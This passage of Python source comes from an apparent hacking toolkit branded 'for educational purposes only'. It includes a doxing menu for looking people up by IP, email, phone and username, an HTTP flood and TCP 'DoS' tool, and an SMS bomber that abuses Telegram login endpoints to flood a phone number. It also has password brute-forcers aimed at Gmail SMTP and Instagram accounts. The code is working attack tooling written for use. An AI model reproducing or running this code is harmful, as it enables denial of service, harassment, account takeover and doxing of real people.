                file.write("1. WHOIS INFORMATION:\n")
                file.write("-" * 80 + "\n")
                file.write(whois_info + "\n\n")
                file.write("2. GEOLOCATION:\n")
                file.write("-" * 80 + "\n")
                file.write(f"Google Maps: https://www.google.com/maps/search/?api=1&query={ip}\n")
                file.write(f"IP Geolocation: https://db-ip.com/{ip}\n\n")
                if api_info:
                    file.write("3. EXTENDED INFORMATION (Criminal IP API):\n")
                    file.write("-" * 80 + "\n")
                    file.write(json.dumps(api_info, indent=2) + "\n\n")
                file.write("\n" + "=" * 80 + "\n")
                file.write("Report created with DRESSEN Security Toolkit\n")
                file.write("For educational purposes only\n")
            self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"❌ Error saving report: {e}")

    def run_interactive(self):
        self.color.print_header("🕵️ DOX INSTRUMENTS", "─")
        while True:
            print("\nSelect action:\n")
            menu_items = [
                ("🔍", "Information by IP address"),
                ("🌐", "Information by domain"),
                ("📧", "Information by email"),
                ("👤", "Username search"),
                ("📞", "Phone number OSINT"),
                ("₿", "Bitcoin wallet analysis"),
                ("⟠", "Ethereum wallet analysis"),
                ("📹", "Webcam search by location"),
                ("🗺️", "Google Maps search by coordinates"),
                ("❓", "Show help"),
                ("🔙", "Back to main menu"),
            ]
            for i, (emoji, desc) in enumerate(menu_items, 1):
                self.color.print_menu_item(i, emoji, desc)
            choice = input("\n🎯 Your choice (1-11): ").strip()
            if choice == "1":
                self.ip_info_interactive()
            elif choice == "2":
                self.domain_info_interactive()
            elif choice == "3":
                self.email_info_interactive()
            elif choice == "4":
                self.username_info_interactive()
            elif choice == "5":
                self.phone_info_interactive()
            elif choice == "6":
                self.btc_info_interactive()
            elif choice == "7":
                self.eth_info_interactive()
            elif choice == "8":
                self.cam_search_interactive()
            elif choice == "9":
                self.maps_search_interactive()
            elif choice == "10":
                self.print_help()
                input("\n↩️ Press Enter to continue...")
            elif choice == "11":
                break
            else:
                self.color.print_error("❌ Invalid choice")

    def ip_info_interactive(self):
        self.color.print_header("🌐 IP ADDRESS INFORMATION", "─")
        ip = input("Enter IP address: ").strip()
        if not ip:
            self.color.print_error("IP address not entered")
            return
        print("\n📊 Select options (can be multiple separated by space):")
        print("  [1] Save result to file")
        print("  [2] Get summary")
        print("  [3] Check VPN")
        print("  [4] Check hosting")
        print("  [5] Check malicious activity")
        print("  [6] Check privacy threats")
        print("  [7] Check DNS safety")
        print("  [8] Scan ports")
        print("  [9] Detailed geolocation")
        print("  [10] IP history")
        print("  [11] All options")
        print("  [12] Basic information only")
        choice = input("\n🎯 Your choice (e.g., 1 2 3): ").strip()
        options = {
            "save": "1" in choice or "11" in choice,
            "summary": "2" in choice or "11" in choice,
            "vpn": "3" in choice or "11" in choice,
            "hosting": "4" in choice or "11" in choice,
            "malicious": "5" in choice or "11" in choice,
            "privacy": "6" in choice or "11" in choice,
            "safe_dns": "7" in choice or "11" in choice,
            "ports": "8" in choice or "11" in choice,
            "geo": "9" in choice or "11" in choice,
            "history": "10" in choice or "11" in choice,
        }
        if choice == "12":
            options = {k: False for k in options}
        self.get_ip_info(ip, save_to_file=options["save"], options=options)
        input("\n↩️ Press Enter to continue...")

    def domain_info_interactive(self):
        self.color.print_header("🌐 DOMAIN INFORMATION", "─")
        domain = input("Enter domain name: ").strip()
        if not domain:
            self.color.print_error("Domain not entered")
            return
        save = input("💾 Save result to file? (y/n): ").lower() == 'y'
        self.get_domain_info(domain, save_to_file=save)
        input("\n↩️ Press Enter to continue...")

    def email_info_interactive(self):
        self.color.print_header("📧 EMAIL INFORMATION", "─")
        email = input("Enter email address: ").strip()
        if not email:
            self.color.print_error("Email not entered")
            return
        save = input("💾 Save result to file? (y/n): ").lower() == 'y'
        self.get_email_info(email, save_to_file=save)
        input("\n↩️ Press Enter to continue...")

    def username_info_interactive(self):
        self.color.print_header("👤 USERNAME SEARCH", "─")
        username = input("Enter username: ").strip()
        if not username:
            self.color.print_error("Username not entered")
            return
        save = input("💾 Save result to file? (y/n): ").lower() == 'y'
        self.get_username_info(username, save_to_file=save)
        input("\n↩️ Press Enter to continue...")

    def phone_info_interactive(self):
        self.color.print_header("📞 PHONE NUMBER OSINT", "─")
        phone = input("Enter phone number (with country code): ").strip()
        if not phone:
            self.color.print_error("Phone number not entered")
            return
        save = input("💾 Save result to file? (y/n): ").lower() == 'y'
        self.get_phone_info(phone, save_to_file=save)
        input("\n↩️ Press Enter to continue...")

    def btc_info_interactive(self):
        self.color.print_header("₿ BITCOIN WALLET ANALYSIS", "─")
        address = input("Enter Bitcoin address: ").strip()
        if not address:
            self.color.print_error("Address not entered")
            return
        self.get_bitcoin_info(address)
        input("\n↩️ Press Enter to continue...")

    def eth_info_interactive(self):
        self.color.print_header("⟠ ETHEREUM WALLET ANALYSIS", "─")
        address = input("Enter Ethereum address: ").strip()
        if not address:
            self.color.print_error("Address not entered")
            return
        self.get_ethereum_info(address)
        input("\n↩️ Press Enter to continue...")

    def cam_search_interactive(self):
        self.color.print_header("📹 WEBCAM SEARCH", "─")
        country = input("Enter country (e.g., USA): ").strip()
        city = input("Enter city (e.g., NewYork): ").strip()
        if not country or not city:
            self.color.print_error("Country and city must be specified")
            return
        self.search_cams(country, city)
        input("\n↩️ Press Enter to continue...")

    def maps_search_interactive(self):
        self.color.print_header("🗺️ GOOGLE MAPS SEARCH", "─")
        longitude = input("Enter longitude: ").strip()
        latitude = input("Enter latitude: ").strip()
        if not longitude or not latitude:
            self.color.print_error("Longitude and latitude must be specified")
            return
        self.search_google_maps(longitude, latitude)
        input("\n↩️ Press Enter to continue...")

    def run_command_line(self, args):
        if "-h" in args or "--help" in args:
            self.print_help()
            return True
        if "-CAM" in args:
            try:
                country_index = args.index("-Country")
                city_index = args.index("-City")
                country = args[country_index + 1]
                city = args[city_index + 1]
                self.search_cams(country, city)
            except (ValueError, IndexError):
                self.color.print_error("Error: specify country and city")
            return True
        if "-GOOGLEMAPS" in args:
            try:
                long_index = args.index("-LONG")
                lat_index = args.index("-LAT")
                longitude = args[long_index + 1]
                latitude = args[lat_index + 1]
                self.search_google_maps(longitude, latitude)
            except (ValueError, IndexError):
                self.color.print_error("Error: specify longitude and latitude")
            return True
        if "-ip" in args:
            try:
                ip_index = args.index("-ip")
                ip = args[ip_index + 1]
                options = {
                    "save": "-o" in args,
                    "summary": "-S" in args,
                    "vpn": "-V" in args,
                    "hosting": "-H" in args,
                    "malicious": "-M" in args,
                    "privacy": "-P" in args,
                    "safe_dns": "-Safe" in args,
                    "ports": "-ports" in args,
                    "geo": "-geo" in args,
                    "history": "-history" in args,
                }
                self.print_banner()
                self.get_ip_info(ip, save_to_file=options["save"], options=options)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify IP address after -ip")
                return False
        if "-domain" in args:
            try:
                domain_index = args.index("-domain")
                domain = args[domain_index + 1]
                save = "-o" in args
                self.get_domain_info(domain, save_to_file=save)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify domain after -domain")
                return False
        if "-email" in args:
            try:
                email_index = args.index("-email")
                email = args[email_index + 1]
                save = "-o" in args
                self.get_email_info(email, save_to_file=save)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify email after -email")
                return False
        if "-username" in args:
            try:
                username_index = args.index("-username")
                username = args[username_index + 1]
                save = "-o" in args
                self.get_username_info(username, save_to_file=save)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify username after -username")
                return False
        if "-PHONE" in args:
            try:
                phone_index = args.index("-PHONE")
                phone = args[phone_index + 1]
                self.get_phone_info(phone)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify phone number after -PHONE")
                return False
        if "-BTC" in args:
            try:
                btc_index = args.index("-BTC")
                address = args[btc_index + 1]
                self.get_bitcoin_info(address)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify Bitcoin address after -BTC")
                return False
        if "-ETH" in args:
            try:
                eth_index = args.index("-ETH")
                address = args[eth_index + 1]
                self.get_ethereum_info(address)
                return True
            except (ValueError, IndexError):
                self.color.print_error("Error: specify Ethereum address after -ETH")
                return False
        self.color.print_error("❌ Invalid arguments. Use -h for help")
        return False

    def run(self):
        self.color.print_header("🕵️ DOX INSTRUMENTS", "─")
        mode = input("Select mode (1 - interactive, 2 - command line): ").strip()
        if mode == "1":
            self.run_interactive()
        elif mode == "2":
            print("\nEnter command (e.g., -ip 8.8.8.8 -o -S)")
            print("Use -h for help")
            cmd = input("> ").strip()
            args = cmd.split()
            self.run_command_line(args)
            input("\n↩️ Press Enter to continue...")
        else:
            self.color.print_error("Invalid choice")

class DDoSAttack:
    def __init__(self, color_manager):
        self.color = color_manager
        self.COLOR_CODE = {"RESET": "\033[0m", "GREEN": "\033[32m", "RED": "\033[31m"}

    def ddos_attack(self):
        self.color.print_header("⚡ DDoS ATTACK", "─")
        try:
            link = input(Colorate.Horizontal(Colors.green_to_white, "\nEnter URL for DDoS attack: "))
            num_threads = int(input(Colorate.Horizontal(Colors.green_to_white, "Enter number of threads: ")))
            attack_duration = int(input(Colorate.Horizontal(Colors.green_to_white, "Enter attack duration (seconds): ")))
            def send_request(session):
                while time.time() < end_time:
                    try:
                        session.get(link, timeout=5)
                        print(f"{self.COLOR_CODE['GREEN']}Request sent to {link}{self.COLOR_CODE['RESET']}")
                    except requests.RequestException:
                        print(f"{self.COLOR_CODE['RED']}Error sending request to {link}{self.COLOR_CODE['RESET']}")
            end_time = time.time() + attack_duration
            threads = []
            session = requests.Session()
            self.color.print_info(f"🎯 Starting attack on {link}")
            self.color.print_info(f"📊 Threads: {num_threads}")
            self.color.print_info(f"⏱️ Duration: {attack_duration} seconds")
            for i in range(num_threads):
                self.color.progress_bar(i + 1, num_threads, prefix="Creating threads:", suffix="Ready", length=30)
                time.sleep(0.1)
            print()
            for _ in range(num_threads):
                thread = threading.Thread(target=send_request, args=(session,))
                threads.append(thread)
                thread.start()
            self.color.print_info("🔥 Attack launched! Waiting for completion...")
            attack_progress = 0
            while time.time() < end_time:
                elapsed = attack_duration - (end_time - time.time())
                progress = (elapsed / attack_duration) * 100
                self.color.progress_bar(int(progress), 100, prefix="Attack:", suffix=f"{int(elapsed)}/{attack_duration}s", length=40)
                time.sleep(1)
            for thread in threads:
                thread.join()
            print()
            self.color.print_success("DDoS attack completed")
        except ValueError:
            self.color.print_error("Error: invalid number format")
        except Exception as e:
            self.color.print_error(f"Error launching attack: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

    def run(self):
        self.ddos_attack()

class SMSBomber:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("💣 SMS BOMBER", "─")
        try:
            print("Press Enter to start...")
            a = input()
            if a != "":
                return
            ascii_banner = pyfiglet.figlet_format("SMS BOMBER")
            print(colored(ascii_banner, color="magenta"))
            number = input("Enter phone number: ")
            if not number:
                self.color.print_error("Number not entered")
                input(f"\n↩️ Press Enter to return to menu...")
                return
            count = 0
            total_requests = 15
            self.color.print_info("🚀 Starting request sending...")
            try:
                for cycle in range(3):
                    user = UserAgent().random
                    headers = {"user-agent": user}
                    requests_list = [
                        ("https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin", {"phone": number}),
                        ("https://translations.telegram.org/auth/request", {"phone": number}),
                        ("https://translations.telegram.org/auth/request", {"phone": number}),
                        ("https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F", {"phone": number}),
                        ("https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F", {"phone": number}),
                        ("https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch", {"phone": number}),
                        ("https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin", {"phone": number}),
                        ("https://my.telegram.org/auth/send_password", {"phone": number}),
                    ]
                    for i, (url, data) in enumerate(requests_list):
                        try:
                            response = requests.post(url, headers=headers, data=data, timeout=10)
                            count += 1
                            self.color.progress_bar(cycle * len(requests_list) + i + 1, total_requests * 3, prefix="Sending requests:", suffix=f"Sent: {count}", length=40)
                        except:
                            pass
                    print(colored(f"\n✅ Cycle {cycle+1} completed. Codes sent successfully", "cyan"))
                    print(colored(f"📊 Total cycles: {cycle+1} ", "cyan"))
            except Exception as e:
                self.color.print_error(f"Error: {e}")
            self.color.print_success(f"🎉 Total requests sent: {count}")
        except KeyboardInterrupt:
            self.color.print_warning("Bomber stopped by user")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

class IPDOSAttack:
    def __init__(self, color_manager):
        self.color = color_manager
        self.COLOR_CODE = {"RESET": "\033[0m", "GREEN": "\033[32m", "RED": "\033[31m", "PURPLE": "\033[95m"}

    def print_colored(self, text, color):
        print(self.COLOR_CODE[color] + text + self.COLOR_CODE["RESET"])

    def get_target_ip(self):
        return input(self.COLOR_CODE["PURPLE"] + "Enter IP address for attack: " + self.COLOR_CODE["RESET"])

    def send_tcp_request(self, ip, port, request_num):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            self.print_colored(f"[{request_num}] [+] Socket connected successfully", "GREEN")
            sock.close()
            return True
        except socket.error as e:
            self.print_colored(f"[{request_num}] [-] Socket connection failed: {e}", "RED")
            return False

    def run(self):
        banner = """
                                                                             
 █    ██  ████    █ ▓██████ ▓█████  ██▓▄█▀   ██▓▄     ██▓  █████▄  ▓▓█    ▓▓█  █████▌▓█████ 
 ██  ▓██▌ ██ ▀█   █ ▓██▀ ██▌▓█   ▀ ▄█▓▀   ▀ ▓█▀▓█▌    ▓█▀▄█▀   ▀ ▓█▌ ██▌▓█▀▄▀   ▄█ ▓█   ▀ 
▓██  ██▌▓█  ▀█ ██▌▀ ██   ██▌▓█▀▀▀ ▐██   ▓█▌▐███   ▓█▀▀█▌▄▄█▀ ▄▄█▀ ██▌▐███▀▀██▄ ▄█▀ ██▀▀▀ 
▓▓█  ██▌█▄ ▄█ ▓▓██  ██▄▄ ██▌██   ██▌▓█▄▄   ██▓██    ▓█ ██▓█  ▀▀██▄ ▓█ ██▓██  ██▌▀██▄ ██    
▓▓███▓█ ▓█▀▀█▄ ▓█▓█▄ ██████▌███████▌▓█████▌▓███▀    ▀█ ██▀▀███▄ ▀███▄██▀▀ ██▀ ▀██▄███████ 
▀▀▀▀▀▀▀ ▀▀  ▀▀ ▀▀▀▀  ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀       ▀ ▀▀   ▀▀▀  ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀▀
                                                                             
"""
        self.print_colored(banner, "PURPLE")
        try:
            ip_address = self.get_target_ip()
            if not ip_address:
                self.color.print_error("IP address not entered")
                input(f"\n↩️ Press Enter to return to menu...")
                return
            port = 80
            num_requests = 100
            self.color.print_info(f"🎯 Target: {ip_address}:{port}")
            self.color.print_info(f"📊 Number of requests: {num_requests}")
            successful = 0
            failed = 0
            for i in range(num_requests):
                self.color.progress_bar(i + 1, num_requests, prefix="Attack:", suffix=f"Successful: {successful}", length=40)
                if self.send_tcp_request(ip_address, port, i + 1):
                    successful += 1
                else:
                    failed += 1
                time.sleep(0.5)
            print()
            self.color.print_success(f"✅ Attack completed")
            self.color.print_info(f"📈 Statistics:")
            self.color.print_info(f"   ✅ Successful connections: {successful}")
            self.color.print_info(f"   ❌ Failed connections: {failed}")
        except KeyboardInterrupt:
            self.color.print_warning("Attack interrupted by user")
        except Exception as e:
            self.color.print_error(f"Error during attack: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

class ServiceMenu:
    def __init__(self, color_manager):
        self.color = color_manager
        self.bannerservice = """
┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
│[1] Python Code Obfuscation Service                                                                 │
│[2] Database Breach Search (with VPN)                                                              │
│[3] Email Breach Check Service                                                                     │
│[4] Auto Check Service                                                                             │
│[5] Darknet Search Service                                                                         │
│[6] HLR Number Check Service                                                                       │
│[7] Port Scanner Service                                                                           │
│[8] Subdomain Scanner                                                                              │
│[9] DNS Reconnaissance                                                                             │
│[10] SSL Certificate Analysis                                                                      │
│[11] Website Technology Detector                                                                   │
│[12] Wayback Machine Lookup                                                                        │
│[13] Security Headers Checker                                                                      │
│[14] CVE Database Search                                                                           │
│[15] Reverse IP Lookup                                                                             │
└────────────────────────────────────────────────────────────────────────────────────────────────────┘
"""

    def run(self):
        clear_screen()
        self.color.print_header("🔧 SERVICES AND TOOLS", "─")
        print(self.bannerservice)
        select = input("[?] Enter service number -> ")
        services = {
            "1": ("https://freecodingtools.org/py-obfuscator", "Python Obfuscator"),
            "2": ("https://cybersec.org/search", "Database Search"),
            "3": ("https://haveibeenpwned.com", "Email Check"),
            "4": ("https://allstate.com", "Auto Check"),
            "5": ("https://darksearch.ai", "Darknet Search"),
            "6": ("https://smsc.ru/testhlr", "HLR Check"),
            "7": ("https://hdmn.org/ru/port-scanner", "Port Scanner"),
            "8": ("https://dnsdumpster.com", "Subdomain Scanner"),
            "9": ("https://viewdns.info", "DNS Recon"),
            "10": ("https://www.ssllabs.com/ssltest/", "SSL Analysis"),
            "11": ("https://builtwith.com", "Tech Detector"),
            "12": ("https://web.archive.org", "Wayback Machine"),
            "13": ("https://securityheaders.com", "Security Headers"),
            "14": ("https://cve.mitre.org", "CVE Database"),
            "15": ("https://reverseip.domaintools.com", "Reverse IP"),
        }
        if select in services:
            url, name = services[select]
            self.color.print_info(f"🌐 Opening service: {name}")
            webbrowser.open(url)
            back = input("\n[?] Return to main menu? Yes/No -> ")
            if back.lower() == "yes":
                return
            elif back.lower() == "no":
                self.color.print_warning("[!] OK, you will not return to main menu")
                input("\n↩️ Press Enter to exit...")
                exit()
        else:
            self.color.print_error("[!] Error, check your input")
            time.sleep(3)
            self.run()

class EmailHack:
    def __init__(self, color_manager):
        self.color = color_manager
        self.GMAIL_PORT = "587"

    def artwork(self):
        print("\n")
        colors = ["\033[92m", "\033[91m", "\033[0;33m"]
        RAND = random.choice(colors)
        art = (
            RAND
            + """
     ▄██▄  ███▄ ▄███▄ ▄▄▄       ██▄ ██▄     ██▌ ██  ▄▄▄       ▄████▄   ██ ▄██▀
    ██▌ ▀█▌▀██▀▀██▀▀██▀▀▀█▄    ▓██▄▓██▄    ▓██▌ ██▄▄██▀▀▀█▄    ▀██▀ ▀   ████▌
   ▓██▌▄▄▄▌▄▓█    ▓██▌▄█▄  ▀█▄  ▓██▄▄██▌    ▓██▀▀██▌▄█▄  ▀█▄  ▄▀█    ▄ ▓███▄▌
   ▓▓█  ██▄▄▓█    ▓██▀▀▀▀██▄█▌ ▓██▌▄▄██▌    ▓█ ██▌▄██▀▀▀▀██▄█▌ ▓▄▄▄▄ ▄▄███▀▄▓█ █▄
   ▓▓██▓█ ▓█▀▀█▄ ▓█████▄▀█▄▀▀ ██▌█████▌▓███▀    ▀ ██▀▀███▄ ▀███▄██▀▀ ██▀ ▀██▄███████
    ▀▀  ▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀       ▀ ▀▀   ▀▀▀  ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀▀"""
        )
        print(art)

    def run(self):
        self.artwork()
        try:
            user = input("Enter target Gmail email: ")
            if not user:
                self.color.print_error("Email not entered")
                input(f"\n↩️ Press Enter to return to menu...")
                return
            pwd = input("Enter '0' to use built-in password list\nEnter '1' to add your own password list\nOption: ")
            if pwd == "0":
                passswfile = "passwords.txt"
                self.color.print_info("Using standard password list")
            elif pwd == "1":
                passswfile = input("Enter path to password file: ")
                if not os.path.exists(passswfile):
                    self.color.print_error(f"File {passswfile} not found")
                    return
            else:
                self.color.print_error("Invalid input! Exiting...")
                return
            try:
                with open(passswfile, "r") as f:
                    passwords = f.readlines()
                    self.color.print_info(f"📁 Loaded passwords: {len(passwords)}")
                    found = False
                    for i, password in enumerate(passwords):
                        password = password.strip()
                        try:
                            smtp = smtplib.SMTP("smtp.gmail.com", self.GMAIL_PORT)
                            smtp.ehlo()
                            smtp.starttls()
                            smtp.login(user, password)
                            self.color.print_success(f"[+] Password found: {password}")
                            found = True
                            smtp.quit()
                            break
                        except smtplib.SMTPAuthenticationError:
                            self.color.progress_bar(i + 1, len(passwords), prefix="Bruteforcing password:", suffix=f"Checked: {i+1}/{len(passwords)}", length=40)
                            if hasattr(smtp, "quit"):
                                try:
                                    smtp.quit()
                                except:
                                    pass
                        except Exception as e:
                            self.color.print_error(f"Error: {e}")
                            if hasattr(smtp, "quit"):
                                try:
                                    smtp.quit()
                                except:
                                    pass
                            break
                    if not found:
                        self.color.print_error("[-] Password not found in list")
            except FileNotFoundError:
                self.color.print_error(f"File {passswfile} not found")
            except Exception as e:
                self.color.print_error(f"Error: {e}")
        except KeyboardInterrupt:
            self.color.print_warning("Email hack interrupted by user")
        except Exception as e:
            self.color.print_error(f"Error connecting to SMTP: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

class InstagramHack:
    def __init__(self, color_manager):
        self.color = color_manager

    def userExists(self, username):
        try:
            r = requests.get(f"https://www.instagram.com/{username}/?__a=1", timeout=10)
            if r.status_code == 404:
                self.color.print_error("User not found")
                return False
            elif r.status_code == 200:
                try:
                    followdata = json.loads(r.text)
                    fUserID = followdata["user"]["id"]
                    return {"username": username, "id": fUserID}
                except:
                    return {"username": username, "id": "unknown"}
        except:
            return False

    def Login(self, username, password):
        sess = requests.Session()
        sess.cookies.update({"sessionid": "", "mid": "", "ig_pr": "1", "ig_vw": "1920", "csrftoken": "", "s_network": "", "ds_user_id": ""})
        sess.headers.update({"UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "x-instagram-ajax": "1", "X-Requested-With": "XMLHttpRequest", "origin": "https://www.instagram.com", "ContentType": "application/x-www-form-urlencoded", "Connection": "keep-alive", "Accept": "*/*", "Referer": "https://www.instagram.com", "authority": "www.instagram.com", "Host": "www.instagram.com", "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4", "Accept-Encoding": "gzip, deflate"})
        try:
            r = sess.get("https://www.instagram.com/")
            sess.headers.update({"X-CSRFToken": r.cookies.get_dict().get("csrftoken", "")})
            data = {"username": username, "password": password}
            r = sess.post("https://www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
            if r.status_code == 200:
                try:
                    data = json.loads(r.text)
                    if data.get("authenticated", False):
                        return sess
                    else:
                        self.color.print_error(f"Wrong password: {password}")
                        return False
                except:
                    return False
            return False
        except:
            return False

    def run(self):
        self.color.print_header("📸 INSTAGRAM HACK", "─")
        try:
            filename = "pass.txt"
            if not os.path.exists(filename):
                self.color.print_error(f"File {filename} not found. Create a file with password list.")
                input(f"\n↩️ Press Enter to return to menu...")
                return
            with open(filename, "r", encoding="utf-8") as f:
                passwords = f.read().splitlines()
                self.color.print_info(f"✅ Loaded passwords: {len(passwords)}")
            username = input("Enter Instagram username: ").strip()
            if not username:
                self.color.print_error("Username not entered")
                input(f"\n↩️ Press Enter to return to menu...")
                return
            user_info = self.userExists(username)
            if not user_info:
                input(f"\n↩️ Press Enter to return to menu...")
                return
            delay = input("Delay between attempts (in seconds, default 1): ")
            try:
                delayLoop = int(delay) if delay.strip() else 1
            except:
                delayLoop = 1
            self.color.print_info(f"🔍 Starting password bruteforce for {username}")
            found = False
            for i, password in enumerate(passwords):
                try:
                    self.color.progress_bar(i + 1, len(passwords), prefix="Bruteforcing password:", suffix=f"Checked: {i+1}/{len(passwords)}", length=40)
                    sess = self.Login(username, password.strip())
                    if sess:
                        self.color.print_success(f"✅ Successful login! {username}:{password}")
                        found = True
                        break
                    time.sleep(delayLoop)
                except KeyboardInterrupt:
                    self.color.print_warning("Bruteforce interrupted by user")
                    an = input("Exit? (y/n): ")
                    if an.lower() == "y":
                        break
                    else:
                        continue
                except:
                    continue
            if not found:
                self.color.print_error("❌ Password not found in list")
        except KeyboardInterrupt:
            self.color.print_warning("Instagram hack interrupted by user")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input(f"\n↩️ Press Enter to return to menu...")

class PhoneNumberProbe:
    def __init__(self, color_manager):
        self.color = color_manager
        self.check_number_link = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.not_found_text = "Information missing"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"})

    def get_number_data(self, user_number):
        try:
            response = self.session.get(self.check_number_link + user_number, timeout=10)
            if response.ok:
                return response.json()
            else:
                return {"status_error": True}
        except requests.exceptions.ConnectionError:
            return {"status_error": True}
        except Exception as e:
            return {"status_error": True, "error": str(e)}

    def format_number(self, number):
        clean = re.sub(r"[^\d+]", "", number)
        if clean.startswith("8") and len(clean) == 11:
            clean = "+7" + clean[1:]
        elif clean.startswith("7") and len(clean) == 11:
            clean = "+" + clean
        elif not clean.startswith("+"):
            clean = "+" + clean
        return clean

    def generate_search_links(self, phone):
        clean_phone = phone.replace("+", "")
        links = [
            ("Instagram", f"https://www.instagram.com/accounts/password/reset"),
            ("WhatsApp", f"https://api.whatsapp.com/send?phone={phone}&text=Hello"),
            ("Facebook", f"https://facebook.com/login/identify"),
            ("LinkedIn", f"https://www.linkedin.com/checkpoint/rp/request-password-reset"),
            ("Odnoklassniki", f"https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink"),
            ("Twitter/X", f"https://twitter.com/account/begin_password_reset"),
            ("Viber", f"https://viber://add?number={clean_phone}"),
            ("Skype", f"skype:{clean_phone}?call"),
            ("Telegram", f"https://t.me/{clean_phone}"),
            ("Call", f"tel:{phone}"),
            ("VK", f"https://vk.com/phone/{clean_phone}"),
            ("Google", f"https://www.google.com/search?q={phone}"),
            ("Yandex", f"https://yandex.ru/search/?text={phone}"),
            ("Bing", f"https://www.bing.com/search?q={phone}"),
            ("DuckDuckGo", f"https://duckduckgo.com/?q={phone}"),
        ]
        return links

    def run(self):
        self.color.print_header("🔍 PHONE NUMBER PROBE", "─")
        try:
            user_number = input("📞 Enter phone number (e.g., +79833170773): ").strip()
            if not user_number:
                self.color.print_error("Phone number not entered")
                input("\n↩️ Press Enter to continue...")
                return
            formatted_number = self.format_number(user_number)
            self.color.print_info(f"🔍 Searching data for: {formatted_number}")
            for i in range(100):
                self.color.progress_bar(i + 1, 100, prefix="Searching data:", suffix="Completed", length=40)
                time.sleep(0.02)
            print()
            number_data = self.get_number_data(formatted_number.replace("+", ""))
            if number_data.get("limit", 1) <= 0:
                self.color.print_warning("⚠️ Request limits exhausted")
                self.color.print_info(f"Total limits: {number_data.get('limit', self.not_found_text)}")
            elif number_data.get("status_error") or number_data.get("error"):
                self.color.print_error("❌ Data not found")
                self.color.print_info("Check number correctness or try again later")
            else:
                country = number_data.get("country", {})
                capital = number_data.get("capital", {})
                region = number_data.get("region", {"autocod": self.not_found_text, "name": self.not_found_text, "okrug": self.not_found_text})
                other = number_data.get("0", {})
                self.color.print_header("📊 NUMBER INFORMATION", "─")
                info_items = []
                if country.get("country_code3") == "UKR":
                    info_items.append(("🌍 Country", "Ukraine"))
                else:
                    info_items.append(("🌍 Country", f"{country.get('name', self.not_found_text)}, {country.get('fullname', self.not_found_text)}"))
                info_items.append(("🏙️ City", other.get("name", self.not_found_text)))
                info_items.append(("📮 Postal code", str(other.get("post", self.not_found_text))))
                info_items.append(("💱 Currency code", str(country.get("iso", self.not_found_text))))
